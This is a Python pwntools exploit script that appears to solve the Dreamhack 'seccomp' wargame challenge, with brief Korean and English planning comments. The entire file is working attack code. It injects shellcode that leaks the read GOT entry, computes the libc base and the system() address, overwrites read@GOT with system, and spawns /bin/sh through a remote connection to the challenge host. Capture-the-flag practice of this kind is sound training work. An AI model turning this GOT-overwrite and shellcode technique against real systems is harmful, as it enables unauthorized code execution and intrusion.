from pwn import *
context.arch = "amd64" #amd64 == x86_64
context.log_level = "debug"
# p = process("./seccomp")
p = remote("host1.dreamhack.games", 20406)
e = ELF("./seccomp")
libc = ELF("./libc6_2.39.so")

#Plan 1. cnt addr leak: 0x7fffffffdfec
#Plan 2. cnt value manipulation
#Plan 3. Can call case 1 
cnt_addr = 0x7fffffffdfec
read_plt = e.plt['read']
read_got = e.got['read']
poprdi = 0x0000000000400c33

def reset_cnt():
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"addr: ", str(cnt_addr).encode()) #10진수 문자열
    p.sendlineafter(b"value: ", b"0")

def case1(a):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"shellcode: ", a)

def case2():
    p.sendlineafter(b"> ", b"2")

def case3(a, b):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"addr: ", a)
    p.sendlineafter(b"value: ", b)

#rdi is pointer so, 
payload = shellcraft.write(1, read_got, 6)
payload += shellcraft.read(0, read_got, 8)
payload += shellcraft.write(1, read_got, 6)
payload += '''
    xor rcx, rcx
    mov rcx, 0x68732f6e69622f
    push rcx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x400770
    call rax
'''

case1(asm(payload))
case2()
# gdb.attach(p)
leak_read = u64(p.recvn(6) + B"\x00\x00")
print(hex(leak_read))

libc_base = leak_read - libc.symbols["read"]
system = libc_base + libc.symbols["system"]
print("Libc base: ", hex(libc_base))
print("System: ", hex(system))

p.send(p64(system))
covered = u64(p.recvn(6) + b"\x00\x00")
print("Covered: ", hex(covered))

p.interactive()
